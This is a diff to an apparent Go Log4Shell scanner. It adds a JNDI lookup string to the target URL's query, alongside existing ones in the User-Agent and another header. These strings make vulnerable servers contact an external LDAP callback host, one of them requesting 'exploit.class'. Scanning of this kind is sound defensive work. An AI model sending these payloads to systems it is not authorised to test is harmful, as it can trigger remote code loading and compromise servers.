@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"net"
 	"net/http"
+	"net/url"
 	"strings"
 	"sync"
 	"time"
@@ -13,7 +14,7 @@ import (
 	log "github.com/sirupsen/logrus"
 )
 
-func ScanIP(url string, serverUrl string, wg *sync.WaitGroup, resChan chan string) {
+func ScanIP(hostUrl string, serverUrl string, wg *sync.WaitGroup, resChan chan string) {
 	defer wg.Done()
 	const timeoutInterval = 2
 
@@ -27,9 +28,12 @@ func ScanIP(url string, serverUrl string, wg *sync.WaitGroup, resChan chan strin
 		},
 	}
 
-	log.Debugf("Target URL: %s", url)
-	//targetUrl := fmt.Sprintf("%s/${jndi:ldap://%s/exploit.class}", url, serverUrl)
-	targetUrl := url
+	log.Debugf("Target URL: %s", hostUrl)
+	baseUrl, err := url.Parse(hostUrl)
+	param := url.Values{}
+	param.Add("x", fmt.Sprintf("${jndi:ldap://%s/%s}", serverUrl, "test"))
+	baseUrl.RawQuery = param.Encode()
+	targetUrl := baseUrl.String()
 	targetUserAgent := fmt.Sprintf("${jndi:ldap://%s/exploit.class}", serverUrl)
 	targetHeader := fmt.Sprintf("${jndi:ldap://%s/Basic/Command/Base64/Y29udGFjdEBwcm9mZXJvLmlv}", serverUrl)
 	//log.Debugf("Target User-Agent: %s", targetUserAgent)
@@ -46,9 +50,9 @@ func ScanIP(url string, serverUrl string, wg *sync.WaitGroup, resChan chan strin
 		log.Debug(err)
 	}
 	if response != nil {
-		url := strings.Split(url, ":")
+		url := strings.Split(hostUrl, ":")
 		if len(url) != 3 {
-			log.Fatal("Error in response url parsing:", url)
+			log.Fatal("Error in response hostUrl parsing:", url)
 		}
 		msg := fmt.Sprintf("request,%s,%s,%d", strings.Replace(url[1], "/", "", -1), url[2], response.StatusCode)
 		updateCsvRecords(msg)
